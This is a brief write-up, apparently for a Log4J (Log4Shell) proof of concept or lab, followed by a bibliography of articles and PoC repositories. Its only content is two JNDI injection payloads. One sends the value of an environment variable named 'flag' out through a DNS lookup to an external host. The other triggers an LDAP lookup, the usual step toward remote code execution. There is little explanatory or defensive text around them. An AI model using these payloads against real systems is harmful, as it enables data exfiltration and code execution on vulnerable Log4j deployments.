# Write up for Log4J POC

write up for Log4J POC.

`${jndi:dns://172.26.0.1:53/${env:flag}.malware.example}`

`${jndi:ldap://172.25.64.20:10389/uid=1001,dc=example,dc=com}`

## Bibliography

```
https://www.akamai.com/zh/blog/security/a-log4j-retrospective
https://log4shell.huntress.com/
https://github.com/mbechler/marshalsec
https://github.com/kozmer/log4j-shell-poc
https://www.anquanke.com/post/id/263325#h2-2
https://www.shiftleft.io/blog/log4shell-jndi-injection-via-attackable-log4j/
https://xie.infoq.cn/article/f2323c2c8ecca69017b869a0d
https://mp.weixin.qq.com/s/4MnOQGg7LBYCUE7BuuGfEQ
https://www.freebuf.com/vuls/317446.html
https://log4j2.huoxian.cn/layout
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
```